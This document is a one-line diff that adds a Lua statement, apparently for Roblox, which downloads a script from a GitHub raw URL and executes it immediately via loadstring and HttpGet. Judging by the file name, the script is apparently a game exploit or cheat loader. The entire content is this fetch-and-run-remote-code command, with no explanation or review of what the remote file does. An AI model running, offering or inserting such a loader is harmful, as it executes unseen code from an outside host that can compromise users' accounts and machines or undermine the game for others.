@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/vanguards-2nd-anniversary-spam7-vt8d3bsoo65p1e.lua"))()
